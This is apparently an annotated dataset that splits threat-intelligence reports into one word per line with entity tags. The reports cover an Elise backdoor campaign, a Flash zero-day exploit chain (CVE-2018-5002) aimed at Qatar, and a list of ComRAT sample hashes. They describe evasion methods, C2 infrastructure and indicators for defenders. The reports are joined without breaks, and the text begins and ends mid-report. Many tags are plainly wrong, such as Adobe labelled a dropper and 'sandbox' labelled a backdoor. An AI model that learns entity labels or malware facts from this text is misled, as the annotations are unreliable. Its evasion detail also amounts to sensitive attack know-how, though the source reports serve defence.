DllMain

When
attempting
to
find
more
information
about
this
application
,
iDefense
discovered
a
file
with
the
MD5
hash
cfa7954722d4277d26e96edc3289a4ce  B_hash
,
which
features
the
same
application
and
was
mentioned
in
a
2015
report
titled
Operation
Lotus
Blossom
by
the
Unit42
team
at
partner
organization
Palo
Alto
Networks
.

Several
observations
detailed
in
this
report
on
Elise B_malware.backdoor
variant I
C I
align
with
the
findings
disclosed
above
:

•
Similar
targeting
of
Southeast
Asia

•
Same
export
function
name
in
the
dropper
DLL
:
Setting

•
Heavy
anti-virtual-machine
features

•
Similar
obfuscation
techniques
used
to
exfiltrate
data
to
C2
server
(
using
Identical
custom
application
to
load
and
execute
EXEs
or
DLLs
base64-encoded
cookie
values
)

In
contrast
to
the
earlier
campaigns
,
debug
paths
are
completely
stripped
.

Persistence
is
achieved
using
the
Run
Registry
key
with
the
value
name
IAStorD
:
•
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\IAStorD

As
mentioned
earlier
,
two
hidden
DLLs
can
be
discovered
that
are
additionally
injected
into
iexplore.exe
and
have
the
export
functions
named
DePatchEntry
or
EvilEntry
.

These
DLLs
provide
additional
loading
and
other
anti-analysis
functionalities
.

The
malware
attempts
to
spoof
the
host
and
query
non-existing
domains
,
such
as
the
following
:

•
3qyo4o7.7r7i3[.]info B_url.distribute
•
dtdf5vu.nt7yq[.]info  B_url.distribute
•
j.4tc3ldw.g9ml.www0[.]org B_url.distribute
•
38qmk6.0to9[.]info  B_url.distribute
•
ubkv1t.ec0[.]com  B_url.distribute

Copyright
©
2018
Accenture
Security
.
All
rights
reserved
.

THREAT
ANALYSIS

•
7g91xhp.envuy3[.]net
•
l.hovux.eln9wj7.7gpj[.]org
•
w.7sytdjc.wroi.cxy[.]com

This
is
likely
done
to
throw
off
malware
analysts
or
network
administrators
.
The
real

C2
server
,
103.236.150[.]14  B_ip.cncsvr
,
is
actually
hardcoded
(
see
Exhibit
4
)
.

Exhibit
4
:
Real
C2
Server
Hardcoded
in
the
Malware

Copyright
©
2018
Accenture
Security
.
All
rights
reserved
.

THREAT
ANALYSIS

MITIGATION

To
mitigate
the
threat
of
the
described
campaign
,
security
teams
can
consider
blocking
access
to
the
C2
server
103.236.150[.]14  B_ip.cncsvr
and
,
where
applicable
,
ensure
that
the
Microsoft
Security
Update
KB2553204
is
installed
in
order
to
patch
the
CVE-201711882
vulnerability
.

For
threat
hunting
,
iDefense
also
suggests
that
analysts
to
look
for
the
following
artifacts
:

•
A
value
named
IAStorD
in
the
autorun
key

•
A
file
named
FXSAPIDebugLogFile.tmp

•
A
mutex
handle
named
donotbotherme

•
thumbcache_1CD60.db
in
AppData
\
Local
\
Microsoft
\
Windows
\
Explorer
\

For
further
information
regarding
the
Microsoft
Security
Update
KB25533204
,
please
visit
:
https://support.microsoft.com/en-us/help/2553204/description-of-the-securityupdate-for-office-2010-november-14-2017 B_url.normal

Given
the
inherent
nature
of
threat
intelligence
,
the
content
contained
in
this
alert
is
based
on
information
gathered
and
understood
at
the
time
of
its
creation
.

It
is
subject
to
change
.

ACCENTURE
PROVIDES
THE
INFORMATION
ON
AN
'
AS-IS
'
BASIS
WITHOUT
REPRESENTATION
OR
WARRANTY
AND
ACCEPTS
NO
LIABILITY
FOR
ANY
ACTION
OR
FAILURE
TO
ACT
TAKEN
IN
RESPONSE
TO
THE
INFORMATION
CONTAINED
OR
REFERENCED
IN
THIS
REPORT
.

Copyright
©
2018
Accenture
Security
.
All
rights
reserved
.

THREAT
ANALYSIS

CONTACT
US

For
additional
mitigation
steps
and
more
detailed
information
,
please
reach
out
to
your
Accenture
contact
.

Where
support
is
needed
,
Accenture
Security
can
provide
resources
designed
to
mitigate
risks
and
remediate
gaps
in
ICS
security
programs
.

Kelly
Bissell
kelly.bissell@accenture.com B_url.normal

Joshua
Ray
joshua.a.ray@accenture.com  B_url.normal

Uwe
Kissman
uwe.kissman@accenture.com B_url.normal

Ryan
LaSalle
ryan.m.lasalle@accenture.com  B_url.normal

Gareth
Russell
gareth.russell@accenture.com  B_url.normal

Copyright
©
2018
Accenture
Security
.
All
rights
reserved
.

ABOUT
ACCENTURE

Accenture
is
a
leading
global
professional
services
company
,
providing
a
broad
range
of
services
and
solutions
in
strategy
,
consulting
,
digital
,
technology
and
operations
.

Combining
unmatched
experience
and
specialized
skills
across
more
than
40
industries
and
all
business
functions—underpinned
by
the
world's
largest
delivery
network—Accenture
works
at
the
intersection
of
business
and
technology
to
help
clients
improve
their
performance
and
create
sustainable
value
for
their
stakeholders
.

With
approximately
435,000
people
serving
clients
in
more
than
120
countries
,
Accenture
drives
innovation
to
improve
the
way
the
world
works
and
lives
.

Visit
us
at
www.accenture.com B_url.normal

ABOUT
ACCENTURE
SECURITY

Accenture
Security
helps
organizations
build
resilience
from
the
inside
out
,
so
they
can
confidently
focus
on
innovation
and
growth
.

Leveraging
its
global
network
of
cybersecurity
labs
,
deep
industry
understanding
across
client
value
chains
and
services
that
span
the
security
lifecycle
,
Accenture
protects
organization's
valuable
assets
,
end-to-end
.

With
services
that
include
strategy
and
risk
management
,
cyber
defense
,
digital
identity
,
application
security
and
managed
security
,
Accenture
enables
businesses
around
the
world
to
defend
against
known
sophisticated
threats
,
and
the
unknown
.

Follow
us
@AccentureSecure
on
Twitter
or
visit
the
Accenture
Security
blog
.

LEGAL
NOTICE
&
DISCLAIMER
:
©
2018
Accenture
.

All
rights
reserved
.

Accenture
,
the
Accenture
logo
,
iDefense
and
other
trademarks
,
service
marks
,
and
designs
are
registered
or
unregistered
trademarks
of
Accenture
and
its
subsidiaries
in
the
United
States
and
in
foreign
countries
.

All
trademarks
are
properties
of
their
respective
owners
.

All
materials
are
intended
for
the
original
recipient
only
.

The
reproduction
and
distribution
of
this
material
is
forbidden
without
express
written
permission
from
iDefense
.

The
opinions
,
statements
,
and
assessments
in
this
report
are
solely
those
of
the
individual
author
(
s
)
and
do
not
constitute
legal
advice
,
nor
do
they
necessarily
reflect
the
views
of
Accenture
,
its
subsidiaries
,
or
affiliates
.

Given
the
inherent
nature
of
threat
intelligence
,
the
content
contained
in
this
alert
is
based
on
information
gathered
and
understood
at
the
time
of
its
creation
.

It
is
subject
to
change
.

ACCENTURE
PROVIDES
THE
INFORMATION
ON
AN
'
AS-IS
'
BASIS
WITHOUT
REPRESENTATION
OR
WARRANTY
AND
ACCEPTS
NO
LIABILITY
FOR
ANY
ACTION
OR
FAILURE
TO
ACT
TAKEN
IN
RESPONSE
TO
THE
INFORMATION
CONTAINED
OR
REFERENCED
IN
THIS
REPORT
.
ADOBE B_malware.drop
FLASH I
ZERO-DAY B_malware.backdoor
LEVERAGED
FOR
TARGETED
ATTACK
IN
MIDDLE
EAST

June
7
,
2018

By
:
Chenming
Xu
,
Jason
Jones
,
Justin
Warner
,
Dan
Caselden

Tags
:
Exploitation
,
File
Analysis
,
Flash
,
Threat
Detection
,
ZERO-DAY B_malware.backdoor

ICEBRG's
Security
Research
Team
(
SRT
)
has
identified
active
exploitation
of
a
ZERO-DAY B_malware.backdoor
vulnerability
in
ADOBE B_malware.drop
Flash I
that
appears
to
target
persons
and
organizations
in
the
Middle
East
.

The
vulnerability
(
CVE-2018-5002 B_malware.drop
)
allows
for
a
maliciously
crafted
Flash
object
to
execute
code
on
victim
computers
,
which
enables
an
attacker
to
execute
a
range
of
payloads
and
actions
.

This
blog
will
outline
details
on
various
aspects
of
the
discovered
attack
,
the
potential
targeting
of
Qatar
,
and
suggestions
for
defenses
against
similar
attack
chains
.

It
is
our
goal
that
by
sharing
this
,
defensive
teams
will
be
informed
about
recently
discovered
threat
activity
and
more
broadly
understand
the
type
of
indicators
that
can
assist
in
identification
of
similar
attack
vectors
.

ICEBRG
was
the
first
to
report
the
discovered
vulnerability
to
ADOBE
,
on
June
1
,
2018
at
4:14
AM
PDT
.

ADOBE
acted
quickly
to
coordinate
with
ICEBRG
,
reproduce
the
vulnerability
,
and
distribute
a
patch
for
its
software
on
June
7
,
2018
.

Many
thanks
to
the
team
for
working
with
us
.

ATTACK
OVERVIEW

The
exploit
uses
a
Microsoft
Office
document
to
download
and
execute
an
ADOBE B_malware.drop
Flash I
exploit
to
victim
computers
.

The
exploitation B_malware.backdoor
process I
,
detailed
in
Figure
1
,
begins
by
downloading
and
executing
a
remote
Shockwave
Flash
(
SWF
)
file
.

Unlike
most
Flash B_malware.unknown
exploits
delivered
with
Microsoft
Office
,
this
document
uses
a
lesser-known
feature
to
remotely
include
all
SWF
content
from
the
attacker's
server
instead
of
embedding
it
directly
in
the
document
.

The
first
stage
SWF B_malware.drop
includes
a
RSA+AES
cryptosystem
that
protects
the
subsequent
SWF
stage
,
containing
the
actual
exploit
,
which
it
downloads
and
executes
.

Appropriate
use
of
asymmetric
cryptography
,
like
RSA
,
evades
traditional
defenses
such
as
replay-based
network
security
devices
and
prevents
a
post-mortem
network
packet
capture
analysis
.

The
second
SWF B_malware.drop
stage
,
after
exploiting
the
system
and
achieving
code
execution
,
uses
the
same
cryptosystem
to
download
and
execute
shellcode
to
further
enable
the
threat
actor
to
control
the
victim
machine
.

Typically
,
the
final
payload B_malware.backdoor
consists
of
shellcode
that
provides
backdoor
functionality
to
the
system
or
stages
additional
tools
.

ICEBRG
attempted
to
retrieve
the
final
payload
during
analysis
but
was
unable
to
due
to
several
possible
reasons
.

Figure
1
:
Walkthrough
of
exploitation
process

REMOTE B_malware.backdoor
FLASH I
INCLUSION I

The
attack
loads
ADOBE B_malware.drop
Flash I
Player
from
within
Microsoft
Office
,
which
is
a
popular
approach
to
Flash
exploitation
since
Flash
is
disabled
in
many
browsers
.

Attackers
typically
embed
a
Flash
file
within
a
document
,
which
may
contain
the
entire
exploit
,
or
may
stage
the
attack
to
download
exploits
and
payloads
more
selectively
(
e.g.
APT28
/
Sofacy
DealersChoice B_malware.drop
)
.

This
leaves
,
at
a
minimum
,
a
small
Flash
loader
that
defenders
can
flag
for
detection
and
analysts
can
fingerprint
for
tracking
.

Contrary
to
typical
tactics
,
this
attack
uses
a
lesser-known
feature
that
remotely
includes
the
Flash
content
instead
of
directly
embedding
it
within
the
document
(
Figure
2
)
.

Only
XML
wrappers
selecting
the
Flash B_malware.backdoor
Player I
ActiveX I
control
and
an
OLE
Object
supplying
parameters
are
present
.

Figure
2
:
Example
Flash
object
included
via
'
Movie
'
property
which
specifies
remote
location
of
Flash
object
.

This
is
purely
an
example
of
how
the
initial
object
can
be
included
.

Remote
loading
of
the
embedded
Flash
object
has
multiple
significant
advantages
:

Evasion
:
The
document
by
itself
does
not
contain
any
malicious
code
.

Statically
,
the
best
one
can
do
is
detect
the
presence
of
remotely
included
Flash B_malware.backdoor
content I
.

Dynamically
,
the
sandbox B_malware.backdoor
/
simulator B_malware.backdoor
must
interact
with
the
attacker's
server
and
receive
malicious
content
,
necessitating
that
the
analysis
system
has
a
live
connection
to
the
Internet
.

Further
,
the
attacker
may
selectively
serve
the
next
stage
based
upon
the
requesting
IP
address
or
HTTP
headers
(
indicating
a
specific
targeted
environment
)
.

Once
access
is
established
,
the
attacker
may
decommission
their
server
and
subsequent
analysis
of
the
attack
must
rely
on
leftover
forensic
artifacts
.

Targeting
:
Because
the
attacker
can
selectively
serve
exploits
to
the
victim
,
they
can
limit
the
attack
to
intended
victims
.

The
attacker
can
limit
access
to
specific
IP
addresses
,
either
through
whitelisting
networks
of
target
companies
or
individuals
via
a
regional
ISP
,
or
blacklisting
cloud
infrastructure
and
security
companies
.

The
'
Accept-Language
'
and
'
User-Agent
'
in
HTTP
headers
may
also
be
useful
to
whitelist
known
victim
locales
and
victim
environments
or
blacklist
security
products
with
non-standard
or
outdated
responses
.

The
ordering
,
inclusion
,
or
absence
of
HTTP
headers
in
general
may
also
discriminate
between
security
products
,
real
victims
,
and
intended
victims
.

Lastly
,
'
x-flash-version B_malware.backdoor
'
includes
the
version
of
Flash B_malware.backdoor
Player I
on
the
victim
with
which
the
attacker
can
choose
their
most
effective
exploit
server
side
.

Even
with
a
minimal
static
footprint
,
upon
document
load
,
the
remote
Flash
object
will
be
retrieved
and
executed
within
the
context
of
Microsoft
Office
.

CRYPTOGRAPHIC
ROUTINES

Data
transmission
from
the
attacker's
server
to
the
client
is
protected
by
a
custom
cryptosystem
(
Figure
3
)
leveraging
a
symmetric
cipher
(
AES
)
,
that
protects
the
data
payload
and
an
asymmetric
cipher
(
RSA
)
to
protect
the
symmetric
key
.

The
custom
cryptosystem
leverages
a
public
Action
Script
library
for
low
level
operations
.

Figure
3
:
Generic
network
retrieval
and
decrypt
routine

Data
transmission
is
initiated
by
the
client
,
whereby
the
client
HTTP
POSTs
a
randomly
generated
RSA
modulus
n
and
the
exponent
0x10001
,
and
the
server
responds
with
the
following
structure
:

0x0
:
Encrypted
AES
key
length
(
L
)

0x4
:
Encrypted
AES
key

0x4+L
:
AES
IV

0x14+L
:
AES
encrypted
data
payload

Figure
4
:
Structure
of
encrypted
data

To
decrypt
the
data
payload
,
the
client
decrypts
the
encrypted
AES
key
using
its
randomly
generated
private
key
,
then
decrypts
the
data
payload
with
the
decrypted
AES
key
.

The
extra
layer
of
public
key
cryptography
,
with
a
randomly
generated
key
,
is
crucial
here
.

By
using
it
,
one
must
either
recover
the
randomly
generated
key
or
crack
the
RSA
encryption
to
analyze
subsequent
layers
of
the
attack
.

If
implemented
correctly
,
this
renders
packet
capture
in
forensic
analysis
and
automated
security
products
ineffective
.

Furthermore
,
the
decrypted
data
payloads
will
only
reside
in
memory
,
challenging
traditional
disk
forensics
and
non-volatile
artifact
analysis
.

In
this
scenario
,
the
attacker
chose
an
RSA
modulus
length
of
512
bits
,
which
is
considered
insecure
by
today's
standards
and
may
be
cracked
with
notable
effort
.

Consequently
,
offline
analysis
is
possible
,
although
more
laborious
than
online
analysis
,
whereby
the
analyst
may
either
instrument
a
mock
victim
or
create
a
man-in-the-middle
service
,
then
attempt
to
be
exploited
by
the
attacker
.

The
combination
of
a
remotely
included
Flash B_malware.backdoor
exploit I
and
asymmetric
cryptography
are
particularly
powerful
counters
against
postmortem
analysis
.

Once
exploited
,
the
only
artifact
residing
on
the
victim's
system
would
be
the
initial
lure
document
that
only
contains
a
URL
.

In
that
scenario
,
responders
may
look
to
network
packet
captures
to
recreate
the
attack
.

However
,
without
the
victim's
randomly
created
private
key
,
it
would
be
impossible
for
responders
to
decrypt
the
attacker's
code
and
recover
subsequent
protected
stages
like
the
exploit
or
payload
.

In
this
scenario
,
responders
'
only
saving
grace
would
be
the
use
of
a
weak
RSA
modulus
.

USE
OF
ZERO-DAY B_malware.backdoor
EXPLOIT

After
decryption
,
the
exploit
payload
is
loaded
and
triggered
to
allow
for
follow-on
code
execution
.

Although
the
document
is
a
Microsoft
Office
document
,
the
code
is
executing
within
an
ADOBE B_malware.drop
Flash I
container
.

You
might
ask
,
why
conduct
Flash B_malware.backdoor
exploitation
within
Microsoft
Office
?

Over
the
past
several
years
,
many
browsers
have
hardened
their
attack
surface
in
regard
to
external
plugins
and
applications
,
including
ADOBE B_malware.drop
Flash I
.

An
example
of
this
hardening
can
be
seen
with
Google's
Chrome
Browser
v.55
,
which
outright
blocks
Flash
by
default
.

On
the
other
hand
,
Office
still
supports
embedded
ActiveX
controls
,
including
Flash B_malware.backdoor
.

According
to
Microsoft
,
this
will
be
changing
with
its
Office
365
products
in
2019
.

The
use
of
a
ZERO-DAY B_malware.backdoor
,
rather
than
an
'
N-day B_malware.backdoor
'
,
vulnerability
is
particularly
interesting
in
the
context
of
the
attack
chain
.

A
ZERO-DAY B_malware.backdoor
vulnerability
is
a
vulnerability
for
which
there
exists
no
patch
,
whereas
an
'
N-Day B_malware.unknown
'
vulnerability
is
an
attack
that
takes
place
'
N
'
days
after
the
patch
is
available
.

There
are
numerous
benefits
of
leveraging
a
ZERO-DAY B_malware.backdoor
exploit
against
a
target
(
Figure
5
)
.

Code
execution
with
minimal
interaction
:
The
vulnerabilities
used
in
ZERO-DAY B_malware.backdoor
exploits
typically
trigger
with
little
or
no
user
interaction
other
than
opening
the
document
.

Due
to
patches
and
other
protective
mechanism
,
N-day B_malware.unknown
exploits
will
frequently
cause
a
prompt
,
warning
,
popup
or
flat
out
will
not
work
.

Higher
success
rates
with
less
risk
of
discovery
:
Due
to
the
minimally
required
user
interaction
,
users
do
not
get
suspicious
of
the
document
as
easily
and
therefore
do
not
report
the
situation
to
internal
security
teams
.

Most
user
training
focuses
on
informing
users
of
all
the
built-in
security
prompts
rather
than
analyzing
the
overall
suspicion
of
a
scenario
.

Figure
5
:
Benefits
of
using
a
ZERO-DAY B_malware.backdoor
exploit

On
the
other
hand
,
there
are
some
negative
aspects
to
using
a
ZERO-DAY B_malware.backdoor
vulnerability
,
notably
cost
of
operations
and
risk
of
additional
investigation
upon
discovery
.

In
2015
,
leaks
of
conversations
involving
Hacking
Team
revealed
that
ZERO-DAY B_malware.backdoor
exploits
for
ADOBE B_malware.drop
Flash I
were
being
sold
for
$30k-$45k
per
exploit
.

Additionally
,
when
the
discovery
of
a
ZERO-DAY B_malware.backdoor
happens
,
investigators
will
tend
to
dive
deeper
than
if
they
discovered
use
of
an
older
N-day B_malware.unknown
exploit
.

NETWORK
COMMUNICATIONS

During
the
attack
,
the
weaponized
document
downloads
the
initial
SWF
stage
and
multiple
blobs
of
encrypted
data
from
the
attacker's
server
and
provides
basic
system
information
to
the
same
server
,
both
over
HTTP
.

All
downloads
contain
a
unique
32-byte
parameter
named
'
token
'
,
which
is
reused
in
the
URI
paths
of
other
URLs
passed
as
Flash
parameters
.

The
SWF
stages
log
data
to
the
URL
identified
as
'
stabUrl
'
,
which
is
on
the
same
commandand-control
server
.

The
URI
is
constructed
by
appending
a
random
value
onto
a
format
string
(
Figure
6
)
,
whose
values
will
indicate
the
current
function
,
and
progress
within
the
function
,
that
is
transmitted
to
track
successes
and
failures
.

For
example
,
the
value
reported
after
successful
retrieval
of
the
first
stage
is
'
0-0-0
'
.

stabUrl
+
'
%d-%d-%d.png?x=
'
+
Math.random
(
)

Figure
6
:
Computation
of
the
stabURL

Once
that
is
completed
,
a
request
is
made
to
the
'
encKeyUrl
'
parameter
,
which
is
the
second
stage
SWF
containing
the
exploit
.

Upon
retrieval
of
the
second
stage
,
a
request
is
then
made
to
the
'
downloadUrl
'
,
which
is
the
shellcode
payload
.

The
command-andcontrol
server
has
not
responded
with
a
payload
for
the
third-stage
even
when
phoning
home
from
the
assumed
targeted
region
,
which
may
signal
that
the
campaign
has
been
ended
.

The
second
GET
request
to
the
stabUrl
uses
the
values
'
2-0-1
'
to
signify
a
successful
verification
of
a
supported
version
of
Windows
.

This
is
not
significant
for
this
exploit
since
it
returns
true
for
any
version
between
and
including
Windows
XP
to
Windows
10
.

Examples
of
these
network
interactions
can
be
seen
in
Figure
7
and
Figure
8
.

Figure
7
:
Network
Communication
observed
during
analysis

Figure
8
:
Network
trace
of
HTTP
Requests

POSSIBLE
QATARI
TARGETING

The
weaponized
document
(
Figure
9
)
,
titled
'
     ا  ا  ا.xlsx
'
(
translated
to
'
basic_salary
'
)
,
is
an
Arabic
language
themed
document
that
purports
to
inform
the
target
of
employee
salary
adjustments
.

The
document
was
uploaded
from
an
IP
address
in
Qatar
to
VirusTotal
on
May
31
,
2018
.

Most
of
the
job
titles
included
in
the
document
are
diplomatic
in
nature
,
specifically
referring
to
salaries
with
positions
referencing
secretaries
,
ambassadors
,
diplomats
,
etc
.

Figure
9
:
Lure
document
in
Arabic
purporting
to
show
salary
modifications

Within
the
document
,
the
threat
actor
utilizes
the
domain
'
dohabayt[.]com B_url.cncsvr
'
for
malicious
content
which
also
reveals
additional
clues
as
to
the
intended
target
.

When
broken
down
into
parts
(
Figure
10
)
,
the
domain
indicates
a
possible
targeting
of
Qatar
interests
.

The
first
part
contains
'
doha
'
,
which
is
the
capital
of
Qatar
.

The
second
part
also
may
be
mimicking
the
legitimate
Middle
Eastern
job
search
site
'
bayt[.]com B_url.normal
'
in
a
further
attempt
to
blend
in
on
the
network
.

Figure
10
:
Attacker
domain
broken
down
into
pieces

ICEBRG
assesses
with
low
confidence
that
these
aspects
indicate
targeting
of
Qatari
victims
based
on
geopolitical
interests
.

Such
focused
targeting
would
not
be
surprising
given
the
hotbed
of
regional
instability
due
to
an
ongoing
blockade
of
Qatar
by
a
number
of
other
Middle
Eastern
countries
and
recent
allegations
of
Qatar
using
offensive
capabilities
and
contractors
to
target
US
political
organizations
.

This
assessment
should
not
be
considered
an
attempt
to
aid
or
assess
in
true
attribution
of
the
responsible
party
,
but
rather
an
attempt
to
provide
relevant
targeting
information
for
analysts
to
associate
with
a
known
activity
group
or
campaign
.

ATTACK B_malware.infosteal
INDICATORS I

Numerous
atomic
indicators
(
Figure
11
)
were
identified
through
the
attack
chain
of
this
activity
and
might
serve
as
an
initial
method
of
detection
.

Atomic
indicators
are
generally
weak
indicators
given
their
ease
of
modification
within
the
attack
scenario
and
should
only
be
used
as
preliminary
indicators
while
more
robust
methods
are
instituted
.

Indicator
Description
0b4f0d8d57fd1cb9b4408013aa7fe5986339ce66ad09c941e76626b5d872e0b5 B_hash
SHA256
hash
of
the
document
lure
.

185.145.128[.]57 B_ip.cncsvr
IP
Address
of
shared
hosting
provider
(
abelons[.]com B_url.cncsvr
)
hosting
payloads
for
exploit
chain
.

people.dohabayt[.]com B_url.cncsvr
Domain
used
for
various
stages
of
the
exploit
chain
.

6535abc68a777b82b8dca49ffbf2d80af7491e76020028a3e18186e1cad02abe B_hash
SHA256
of
SSL
certificate
observed
on
malicious
infrastructure
.

https://crt.sh/?id=482419008 B_url.cncsvr

internationsplanet[.]com B_url.cncsvr
Domain
associated
with
SSL
certificate
observed
on
malicious
infrastructure
.

Figure
11
:
Table
of
atomic
indicators

Figure
12
:
Timeline
of
various
dates
associated
with
the
involved
indicators

While
this
attack
leveraged
a
ZERO-DAY B_malware.backdoor
exploit
,
individual
attacker
actions
do
not
happen
in
isolation
.

There
are
several
other
behavioral
aspects
that
can
be
used
for
detection
.

Any
single
observable
might
be
low
confidence
but
multiple
observables
clustered
might
be
indicative
of
suspicious
or
malicious
activity
.

Example
observables
include
:

Use
of
Newly
Registered
and
Low
Reputation
Infrastructure
:
The
domains
utilized
in
this
attack
chain
are
very
recently
registered
domains
(
Figure
12
)
and
leverage
low
reputation
hosting
providers
and
registars
that
commonly
host
malicious
sites
.

The
hosting
provider
Abelons
has
been
repeatedly
included
on
spamhaus
and
abused
by
attackers
to
deliver
malicious
content
.

Staged
Download
of
Flash B_malware.drop
:
During
the
attack B_malware.backdoor
chain I
,
the
weaponized
document
loads
the
malicious
Flash B_malware.backdoor
object
through
remote
loading
resulting
in
observable
HTTP
traffic
resulting
with
the
header
'
x-flash-version
'
pulling
a
secondary
Flash
object
(
Figure
8
)
.

Use
of
Newly
Created
'
Let's
Encrypt
'
Certificate
:
A
certificate
observed
being
hosted
on
malicious
infrastructure
,
likely
used
for
some
aspect
of
a
malicious
campaign
,
is
a
newly
observed
certificate
(
Figure
12
)
from
a
free
provider
that
contains
a
hostname
mismatch
with
the
server
itself
.

Office
Document
with
Embedded B_malware.backdoor
Flash I
Using
Remote
Inclusion
:
The
document
utilized
in
the
attack
utilizes
an
uncommon
method
of
embedding
Flash
and
such
methods
,
particularly
from
untrusted
sources
,
should
be
considered
suspicious
.

Detections
have
been
created
and
deployed
to
protect
customers
using
the
ICEBRG
platform
.

ICEBRG
is
a
network
security
analytics
company
that
offers
a
SaaS
capability
that
enables
customers
to
gain
and
utilize
widespread
network
visibility
for
security
operations
.

As
part
of
its
research
,
ICEBRG
coordinates
disclosure
of
security
threats
and
vulnerabilities
with
relevant
parties
in
order
to
maximize
both
the
response
and
victim
remediation
efforts
as
well
as
working
to
truly
improve
the
security
of
customers
and
other
victims
prior
to
publishing
blog
posts
.

To
learn
more
about
ICEBRG
,
contact
us
at
info@icebrg.io
.

SHARE
:





TERMS
OF
USE

PRIVACY
&
COOKIES
POLICY

INFO@ICEBRG.IO

COPYRIGHT
©
2018
ALL
RIGHTS
RESERVED.
﻿Evolution
of
sophisticated
spyware
:
from
Agent.BTZ B_malware.backdoor
to
ComRAT B_malware.backdoor

In
November
2014
,
the
experts
of
the
G
DATA
SecurityLabs
published
an
article
about
ComRAT B_malware.backdoor
,
the
Agent.BTZ B_malware.backdoor
successor
.

We
explained
that
this
case
is
linked
to
the
Uroburos B_malware.backdoor
rootkit I
.

We
assume
that
the
actor
behind
these
campaigns
uses
several
different
malware
strains
is
order
to
compromise
the
targeted
infrastructure
:
Uroburos B_malware.backdoor
,
a
rootkit
;
Agent.BTZ B_malware.backdoor
/
ComRAT B_malware.backdoor
,
remote B_malware.backdoor
administration I
tools I
or
Linux
malware
and
maybe
even
more
.

We
decided
to
have
an
even
closer
look
at
Agent.BTZ B_malware.backdoor
and
ComRAT B_malware.backdoor
and
therefore
analyzed
the
evolution
of
this
RAT B_malware.backdoor
,
covering
seven
years
of
development
.

Here
is
a
table
with
the
minimal
information
about
46
different
samples
:

MD5
Version
Compilation
Date
b41fbdd02e4d54b4bc28eda99a8c1502 B_hash
Ch
1.0
Wed
Jun
13
07:31:32
2007
UTC
93827a6c77e84ffdd9c793d485d3df6e B_hash
Ch
1.0
Wed
Jun
13
07:31:32
2007
UTC
3e9c7ef54ea3d55d5b53abab4c3e2385 B_hash
Ch
1.0
Wed
Jun
13
07:31:32
2007
UTC
b9ed8876ef5a05ba364a9cdbdf4f184d B_hash
Ch
1.0
Tue
Jun
19
12:41:21
2007
UTC
d8f98f64687b05a62c81ce9e52dd808d B_hash
Ch
1.1
Tue
Jun
26
08:46:11
2007
UTC
2cf64ff9dad8d64ee9322e390d4f7283 B_hash
Ch
1.1
Tue
Jun
26
08:46:11
2007
UTC
24e679155697bd31b34036a44d4346a7 B_hash
Ch
1.2wcc
Tue
Jul
24
12:57:37
2007
UTC
53b8b9f779b1d1d298884d1c21313ab3 B_hash
Ch
1.2wcc
Tue
Jul
24
12:57:37
2007
UTC
69ae46fedf3c18ff36fc850e0baa9365 B_hash
Ch
1.2wcc
Tue
Jul
24
12:57:37
2007
UTC
e05511a84eb345954b94f1e05c78bf22 B_hash
Ch
1.2
Thu
Jul
26
07:20:17
2007
UTC
f93ce76f6580d68a95260198b2d6feaa B_hash
Ch
1.3
Mon
Dec
3
14:15:58
2007
UTC
db5d1583704b0fb6d1cff0b62a512a7d B_hash
Ch
1.4
Tue
Dec
11
17:36:03
2007
UTC
2b348c225985679f62e50b28bdb74ac9 B_hash
Ch
1.4
Tue
Dec
11
17:36:03
2007
UTC
af3f0efbd69905123f7df958cc88dff9 B_hash
Ch
1.4
Tue
Dec
11
17:36:03
2007
UTC
e825c4961293ad45883cd52f38695283 B_hash
Ch
1.5
Thu
Mar
27
14:58:15
2008
UTC
2a67b53b7ef7b70763658ca7f60e7005 B_hash
Ch
1.5
Thu
Mar
27
14:58:15
2008
UTC
bbf569176ec7ec611d8a000b50cdb754 B_hash
Ch
1.5
Thu
Mar
27
14:58:15
2008
UTC
e5c76e67128e48cb0f003c2beee47d1f B_hash
Ch
1.5
Thu
Mar
27
14:58:15
2008
UTC
8e5da63369d20e1d2c530bf806996285 B_hash
Ch
2.02
Mon
May
5
11:27:48
2008
UTC
78d3f074b70788897ae7e20e5137bf47 B_hash
Ch
2.03
Mon
May
12
11:52:31
2008
UTC
986f263ca2c529d5d28bce3c62f858ea B_hash
Ch
2.03
Thu
May
22
10:24:55
2008
UTC
4f732099caf5d21729572cec229f7614 B_hash
Ch
2.04
Mon
Jun
9
17:23:56
2008
UTC
5336c24a3399f522f8e19d9c54a069c6 B_hash
Ch
2.04
Mon
Jun
9
17:23:56
2008
UTC
dc1c54751f94b6fdf0b6ecdd64e67701 B_hash
Ch
2.04
Mon
Jun
9
17:23:56
2008
UTC
40335fca60acd05f1428b13a9a3c1228 B_hash
Ch
2.04
Mon
Jun
9
17:23:56
2008
UTC
72663ee9d3efaff959bff4ce25bd37a6 B_hash
Ch
2.04
Mon
Jun
9
17:23:56
2008
UTC
5ef72904221aa4090a262a24714054f0 B_hash
Ch
2.04
Mon
Jun
9
17:23:56
2008
UTC
331eca9c7d9fd9cbe7cd192af09880a3 B_hash
Ch
2.05
Thu
Nov
6
13:21:45
2008
UTC
db1156b072d58acdac1aeab9af2160a2 B_hash
Ch
2.05
Thu
Nov
6
13:21:45
2008
UTC
74dbea70bfb15db31bb9f757ed4bb1a0 B_hash
Ch
2.07
Mon
Dec
29
11:37:17
2008
UTC
eb928bca5675722c7e9e2b09eec1158a B_hash
Ch
2.07
Mon
Dec
29
11:37:17
2008
UTC
162f415abad9708aa61db8e03bcf2f3c B_hash
Ch
2.11
Mon
Sep
14
13:22:57
2009
UTC
448524fd62dec1151c75b55b86587784 B_hash
Ch
2.11
Mon
Sep
14
15:28:07
2009
UTC
29bb70a40689e9e665d15716519bacfd B_hash
Ch
2.12
Tue
Sep
29
10:28:40
2009
UTC
38d6719d6a266c6cefb8626c57378927 B_hash
Ch
2.13
Mon
Dec
7
14:25:12
2009
UTC
02eda1effde92bdf8462abcf40c4f776 B_hash
Ch
2.13
Mon
Dec
7
14:27:53
2009
UTC
5121ce1f96d74076df1c39748e019f42 B_hash
Ch
2.14.1
Wed
Feb
17
15:14:20
2010
UTC
28dc1ca683d6a14d0d1794a68c477604 B_hash
Ch
3.00
Tue
Jan
31
16:12:25
2012
UTC
40bd7846553550f38e458b8493824cb4 B_hash
Ch
3.00
Tue
Feb
14
10:28:06
2012
UTC
ba0c777317461ed57a85ffae277044dc B_hash
Ch
3.02
Wed
Apr
4
16:23:44
2012
UTC
b86137fa5a232c614ec5405be4d13b37 B_hash
Ch
3.10
Tue
Dec
18
08:22:43
2012
UTC
7872c1d88fe21d8a85f160a6666c76e8 B_hash
